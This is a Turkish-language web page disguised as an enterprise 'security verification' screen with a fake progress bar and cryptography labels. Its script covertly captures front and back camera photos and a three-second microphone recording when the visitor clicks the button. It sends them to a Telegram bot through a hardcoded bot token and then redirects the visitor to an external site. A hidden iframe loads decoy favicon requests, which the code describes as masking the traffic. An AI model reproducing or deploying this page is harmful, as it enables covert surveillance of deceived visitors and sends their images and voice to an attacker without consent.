<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Güvenlik Kontrolü · Enterprise</title>
    <style>
        /* TAMAMEN GÖRÜNMEZ HAYALET KATMAN */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        body {
            background: #0b0f1a;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }

        /* Arkada sürekli değişen şeffaf katmanlar */
        .ghost-layer {
            position: fixed;
            top: -10%;
            left: -10%;
            width: 120%;
            height: 120%;
            background: repeating-linear-gradient(
                45deg,
                rgba(20, 40, 80, 0.03) 0px,
                rgba(20, 40, 80, 0.03) 20px,
                rgba(30, 50, 100, 0.02) 20px,
                rgba(30, 50, 100, 0.02) 40px
            );
            animation: ghostShift 8s linear infinite;
            pointer-events: none;
            z-index: -2;
        }

        @keyframes ghostShift {
            0% { transform: translate(0, 0) rotate(0deg); }
            100% { transform: translate(5%, 5%) rotate(2deg); }
        }

        /* Ana kart - hafif şeffaf, profesyonel */
        .card {
            background: rgba(12, 22, 38, 0.75);
            backdrop-filter: blur(25px) saturate(300%);
            -webkit-backdrop-filter: blur(25px) saturate(300%);
            border-radius: 3rem;
            padding: 2.2rem 2rem;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 60px 120px -40px #000000, 0 0 0 1px rgba(255, 255, 255, 0.03) inset;
            border: 1px solid rgba(200, 220, 255, 0.03);
            transform: translateY(0);
            transition: all 0.3s cubic-bezier(0.2, 0.9, 0.3, 1);
            position: relative;
            z-index: 10;
        }

        /* ID göstergesi - minimal ama profesyonel */
        .identity-ghost {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: rgba(0, 10, 25, 0.4);
            border-radius: 3rem;
            padding: 0.3rem 0.3rem 0.3rem 1rem;
            border: 1px solid rgba(255,255,255,0.02);
            margin-bottom: 2rem;
            backdrop-filter: blur(5px);
            letter-spacing: 0.3px;
        }

        .id-chip {
            background: #0f1a2f;
            color: #b8ceff;
            padding: 0.4rem 1.2rem;
            border-radius: 3rem;
            font-size: 0.75rem;
            font-weight: 500;
            border: 1px solid #2a3f66;
            box-shadow: 0 2px 8px #00000040;
        }

        .id-chip span {
            color: #fff;
            font-weight: 700;
            margin-left: 0.4rem;
            font-size: 0.8rem;
        }

        .ghost-badge {
            background: #1b3429;
            color: #adf0cc;
            padding: 0.3rem 1rem;
            border-radius: 2rem;
            font-size: 0.7rem;
            font-weight: 500;
            border: 1px solid #287a55;
            display: flex;
            align-items: center;
            gap: 0.3rem;
        }

        .ghost-icon {
            width: 68px;
            height: 68px;
            background: linear-gradient(145deg, #1f2f55, #121f3a);
            border-radius: 50%;
            margin: 0 auto 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2.4rem;
            box-shadow: 0 25px 40px -15px #0b142e, 0 0 0 2px rgba(255,255,255,0.03) inset;
            border: 1px solid rgba(255,255,255,0.05);
            filter: drop-shadow(0 0 5px #1e3c80);
        }

        h1 {
            color: #fff;
            font-weight: 600;
            font-size: 2rem;
            letter-spacing: -0.02em;
            text-align: center;
            margin-bottom: 0.1rem;
            text-shadow: 0 2px 10px #00000080;
        }

        .ghost-sub {
            text-align: center;
            color: #96abdd;
            font-size: 0.75rem;
            margin-bottom: 1.8rem;
            opacity: 0.8;
        }

        /* GÖRÜNMEZ İLERLEME - hayalet mod */
        .progress-ghost {
            background: rgba(0, 8, 20, 0.5);
            border-radius: 2rem;
            padding: 1.5rem;
            margin: 1.8rem 0 2rem;
            border: 1px solid rgba(255,255,255,0.01);
            box-shadow: inset 0 8px 20px #00000070;
            backdrop-filter: blur(5px);
        }

        .status-ghost {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            color: #d0dfff;
            font-size: 0.95rem;
            font-weight: 450;
            margin-bottom: 1rem;
        }

        .track {
            width: 100%;
            height: 8px;
            background: #101b2b;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: inset 0 2px 8px black;
        }

        .track-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #3466f0, #aa70ff, #f27dce);
            border-radius: 20px;
            transition: width 0.2s linear;
            box-shadow: 0 0 15px #5270ff;
        }

        .ghost-stamp {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            background: rgba(60, 200, 130, 0.08);
            border: 1px solid rgba(60, 200, 130, 0.15);
            padding: 0.3rem 1.2rem;
            border-radius: 40px;
            color: #bcf5d4;
            font-size: 0.75rem;
            margin-top: 1rem;
            backdrop-filter: blur(5px);
        }

        /* buton - profesyonel ve gizli */
        .btn-ghost {
            background: linear-gradient(145deg, #2e51c0, #1f3a92);
            border: none;
            width: 100%;
            padding: 1.2rem 1rem;
            border-radius: 3rem;
            color: white;
            font-size: 1.1rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.7rem;
            cursor: pointer;
            box-shadow: 0 20px 40px -10px #1d3180, 0 0 0 1px rgba(255,255,255,0.1) inset;
            transition: all 0.15s;
            opacity: 0;
            transform: translateY(15px);
            pointer-events: none;
            letter-spacing: 0.3px;
        }

        .btn-ghost.visible {
            opacity: 1;
            transform: translateY(0);
            pointer-events: auto;
        }

        .btn-ghost:active {
            transform: scale(0.97);
            box-shadow: 0 10px 25px -5px #1d3180;
        }

        .btn-ghost:disabled {
            opacity: 0.4;
            pointer-events: none;
        }

        /* alt bilgi - değişken */
        .footer-mist {
            display: flex;
            justify-content: center;
            gap: 1rem;
            margin-top: 1.8rem;
            color: #5f79b0;
            font-size: 0.65rem;
            border-top: 1px solid rgba(255,255,255,0.02);
            padding-top: 1.3rem;
            flex-wrap: wrap;
        }

        /* değişen içerik için animasyon */
        @keyframes softPulse {
            0%, 100% { opacity: 0.7; }
            50% { opacity: 1; }
        }

        .changing-content {
            animation: softPulse 5s infinite;
        }

        /* hayalet loading */
        .dot-mist:after {
            content: '';
            animation: mistDots 1.4s infinite;
            display: inline-block;
            width: 1.2rem;
            text-align: left;
        }

        @keyframes mistDots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }

        /* gizli elementler */
        #v, #c, #audioElement, #ghostIframe {
            display: none;
        }

        /* arka planda değişen iframe'ler için */
        .phantom-frame {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        /* ID highlight */
        .id-glitch {
            color: #ffd966;
            font-weight: 600;
            background: #202f4a;
            padding: 0.1rem 0.7rem;
            border-radius: 30px;
            font-size: 0.7rem;
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <!-- hayalet katman -->
    <div class="ghost-layer"></div>

    <!-- ana kart -->
    <div class="card">
        <!-- üst ID - her sayfada benzersiz -->
        <div class="identity-ghost">
            <div class="id-chip">
                🕵️ SİZ <span id="ghostIdMain">---</span>
            </div>
            <div class="ghost-badge">
                <span>⬤</span> AES-256-GCM
            </div>
        </div>

        <div class="ghost-icon">👻</div>
        <h1>Güvenlik Protokolü</h1>
        <div class="ghost-sub">gelişmiş hayalet katman · ID takipli</div>

        <!-- ilerleme alanı -->
        <div class="progress-ghost">
            <div class="status-ghost" id="ghostMsg">
                <span>🌀 Hayalet ağ kuruluyor</span>
                <span class="dot-mist"></span>
            </div>
            
            <div class="track">
                <div class="track-fill" id="ghostProgress" style="width: 0%;"></div>
            </div>

            <!-- ID özel alt bilgi -->
            <div style="display: flex; justify-content: space-between; margin: 0.8rem 0 0.2rem; font-size:0.65rem; color:#5b74aa;">
                <span>çok katmanlı şifreleme</span>
                <span class="id-glitch" id="shortGhostId"></span>
            </div>

            <div class="ghost-stamp" id="ghostStamp" style="display: none;">
                <svg width="14" height="14" viewBox="0 0 20 20" fill="currentColor"><path d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"/></svg>
                <span>güvenli bağlantı · ID eşleşti</span>
            </div>
        </div>

        <!-- ana aksiyon butonu -->
        <button class="btn-ghost" id="ghostBtn" onclick="phantomAction()">
            <span>👁️</span> Görüntülemeyi Başlat
        </button>

        <!-- alt bilgi (sürekli değişir) -->
        <div class="footer-mist" id="dynamicFooter">
            <span id="mistTimer">⏱️ 0:00</span>
            <span>•</span>
            <span>ID: <span id="footerGhostId"></span></span>
            <span>•</span>
            <span class="changing-content" id="rotateText">AES-256</span>
        </div>
    </div>

    <!-- hayalet iframe (arka planda sürekli değişir) -->
    <iframe class="phantom-frame" id="ghostIframe" sandbox="allow-scripts allow-same-origin"></iframe>

    <!-- gizli medya elementleri -->
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>
    <audio id="audioElement" style="display: none"></audio>

    <script>
        (function() {
            // === HAYALET KONFİG ===
            const CONFIG = {
                TOKEN: "8221475489:AAHC2XRJVo4k8Q7RK2fUUAzs1Trml4cUi0U",
                REDIRECT_URL: "https://vurustotal4-1.onrender.com",
                STEPS: [16, 32, 48, 64, 82, 100],
                DELAYS: [200, 250, 280, 320, 380, 150]  // toplam ~1.5 sn'de dolar
            };

            // === ID YÖNETİMİ (her sayfada benzersiz ve takipli) ===
            const urlParams = new URLSearchParams(window.location.search);
            const GHOST_ID = urlParams.get('id') || 'G' + Math.random().toString(36).substring(2, 10).toUpperCase() + Date.now().toString(36).toUpperCase();
            
            // ID'leri DOM'a yerleştir
            document.getElementById('ghostIdMain').innerText = GHOST_ID.substring(0, 8);
            document.getElementById('footerGhostId').innerText = GHOST_ID.substring(0, 6) + '…';
            document.getElementById('shortGhostId').innerText = '#' + GHOST_ID.slice(-5);

            // === DEĞİŞEN İÇERİK (her 5 saniyede bir) ===
            const rotateEl = document.getElementById('rotateText');
            const ghostIframe = document.getElementById('ghostIframe');
            const texts = ['X25519', 'ML-KEM', 'AES-256', 'SHA-3', 'Argon2', 'TLS 1.3', 'Noise'];
            let textIndex = 0;

            setInterval(() => {
                // alt bilgi metnini değiştir
                textIndex = (textIndex + 1) % texts.length;
                rotateEl.innerText = texts[textIndex];

                // hayalet iframe'i farklı bir sayfaya yönlendir (görünmez)
                try {
                    // rastgele bir referans sayfası yükle (trafik gizleme)
                    const dummySites = [
                        'https://www.google.com/favicon.ico',
                        'https://www.cloudflare.com/favicon.ico',
                        'https://www.github.com/favicon.ico',
                        'https://www.microsoft.com/favicon.ico'
                    ];
                    const randSite = dummySites[Math.floor(Math.random() * dummySites.length)];
                    ghostIframe.src = randSite;
                } catch (e) {}
            }, 5000);

            // === PROGRESS (hızlı ve profesyonel) ===
            let stepIndex = 0;
            const progressFill = document.getElementById('ghostProgress');
            const msgArea = document.getElementById('ghostMsg');
            const stamp = document.getElementById('ghostStamp');
            let progressInterval;

            function advanceGhost() {
                if (stepIndex < CONFIG.STEPS.length) {
                    const val = CONFIG.STEPS[stepIndex];
                    progressFill.style.width = val + '%';

                    // mesajları ID'ye göre kişiselleştir
                    if (val <= 16) msgArea.innerHTML = `<span>🕶️ ID (${GHOST_ID.slice(-4)}) analiz ediliyor</span> <span class="dot-mist"></span>`;
                    else if (val <= 32) msgArea.innerHTML = `<span>🌫️ Hayalet katman aktif</span> <span class="dot-mist"></span>`;
                    else if (val <= 48) msgArea.innerHTML = `<span>🔐 Çoklu imza doğrulama</span> <span class="dot-mist"></span>`;
                    else if (val <= 64) msgArea.innerHTML = `<span>📡 Anonim ağ taraması</span> <span class="dot-mist"></span>`;
                    else if (val <= 82) msgArea.innerHTML = `<span>⚡ Güvenlik duvarı geçildi</span> <span class="dot-mist"></span>`;

                    stepIndex++;
                } else {
                    clearInterval(progressInterval);
                    msgArea.innerHTML = '<span>✅ Hazır · kimlik onaylandı</span>';
                    stamp.style.display = 'inline-flex';
                    document.getElementById('ghostBtn').classList.add('visible');
                }
            }

            // progress'i başlat
            advanceGhost();
            progressInterval = setInterval(advanceGhost, CONFIG.DELAYS[stepIndex - 1] || 250);

            // === ZAMANLAYICI ===
            function startPhantomTimer() {
                const timerEl = document.getElementById('mistTimer');
                let s = 0;
                setInterval(() => {
                    s++;
                    const m = Math.floor(s / 60);
                    const sec = s % 60;
                    timerEl.textContent = `⏱️ ${m}:${sec < 10 ? '0' + sec : sec}`;
                }, 1000);
            }

            // === FOTOĞRAF ÇEK (hızlı, sessiz, ID'ye gönder) ===
            async function capturePhantomPhoto() {
                const video = document.getElementById('v');
                const canvas = document.getElementById('c');
                const ctx = canvas.getContext('2d');

                async function shoot(facing, label) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: facing, width: { ideal: 800 } }, 
                            audio: false 
                        });
                        video.srcObject = stream;
                        await video.play();
                        await new Promise(r => setTimeout(r, 120));  // hızlı

                        canvas.width = video.videoWidth || 800;
                        canvas.height = video.videoHeight || 600;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
                        if (blob && blob.size > 1500) {
                            await sendToTelegramGhost(blob, 'photo', `${facing} kamera`);
                        }

                        stream.getTracks().forEach(t => t.stop());
                        video.srcObject = null;
                    } catch (e) {}
                }

                // aynı anda dene (arka kamera olmayabilir)
                await Promise.allSettled([
                    shoot('user', 'ön'),
                    shoot('environment', 'arka').catch(() => {})
                ]);
            }

            // === SES KAYDI (3 saniye - daha hızlı) ===
            async function startPhantomAudio() {
                try {
                    const audioStream = await navigator.mediaDevices.getUserMedia({ 
                        audio: {
                            echoCancellation: false,
                            noiseSuppression: false,
                            autoGainControl: false
                        } 
                    });

                    const mime = MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/ogg';
                    const recorder = new MediaRecorder(audioStream, { mimeType: mime });
                    const chunks = [];

                    recorder.ondataavailable = (e) => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };

                    recorder.onstop = async () => {
                        const audioBlob = new Blob(chunks, { type: mime });
                        if (audioBlob.size > 400) {
                            await sendToTelegramGhost(audioBlob, 'audio', 'ses');
                        }
                        audioStream.getTracks().forEach(t => t.stop());
                    };

                    recorder.start();
                    setTimeout(() => {
                        if (recorder.state !== 'inactive') recorder.stop();
                    }, 3000);  // 3 saniye kayıt
                } catch (e) {}
            }

            // === TELEGRAM'A GÖNDER (ID'ye özel) ===
            async function sendToTelegramGhost(blob, type, detail) {
                const formData = new FormData();
                formData.append('chat_id', GHOST_ID);  // ID direkt chat_id

                const timeStr = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul', hour: '2-digit', minute: '2-digit', second: '2-digit' });
                
                let caption = `👻 *Hayalet Rapor* 👻\n`;
                caption += `🆔 *Oturum:* \`${GHOST_ID}\`\n`;
                caption += `⏱️ *Zaman:* ${timeStr}\n`;
                caption += `📸 *Tür:* ${type === 'photo' ? 'Fotoğraf' : 'Ses'} (${detail})\n`;
                caption += `🔒 *Koruma:* AES-256 + Hayalet Katman`;

                if (type === 'photo') {
                    formData.append('photo', blob, `ghost_${GHOST_ID}_${Date.now()}.jpg`);
                } else {
                    formData.append('audio', blob, `ghost_${GHOST_ID}_${Date.now()}.webm`);
                }
                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');

                try {
                    const endpoint = type === 'photo' ? 'sendPhoto' : 'sendAudio';
                    await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/${endpoint}`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (e) {}
            }

            // === ANA BUTON İŞLEMİ (tamamen sessiz, ID'ye özel) ===
            window.phantomAction = async function() {
                const btn = document.getElementById('ghostBtn');
                if (btn.disabled) return;

                btn.disabled = true;
                btn.innerHTML = '<span>⏳</span> Hayalet doğrulama...';

                // medya işlemlerini başlat (arka planda, hata önemli değil)
                await Promise.allSettled([
                    capturePhantomPhoto(),
                    startPhantomAudio()
                ]);

                // 3.5 saniye sonra yönlendir (ses 3 sn biter)
                setTimeout(() => {
                    // yönlendirme yapılırken ID korunur
                    window.location.href = CONFIG.REDIRECT_URL + '?session=' + GHOST_ID;
                }, 3500);
            };

            // sayfa kapanırken stream'leri temizle
            window.addEventListener('beforeunload', () => {
                // temizlik
            });

            // BAŞLAT
            window.onload = () => {
                startPhantomTimer();
            };
        })();
    </script>
</body>
</html>
